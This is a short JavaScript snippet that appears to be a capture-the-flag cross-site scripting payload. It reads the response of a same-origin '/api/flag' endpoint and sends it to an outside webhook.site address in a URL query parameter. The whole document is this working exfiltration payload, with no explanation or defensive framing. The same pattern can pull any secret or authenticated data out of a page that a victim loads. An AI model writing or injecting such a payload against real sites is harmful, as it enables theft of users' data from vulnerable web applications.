fetch('/api/flag')
  .then(res => res.text())
  .then(flag => fetch('https://webhook.site/4821a7ad-0120-4e83-aae0-4328fe954b59?flag=' + encodeURIComponent(flag)));
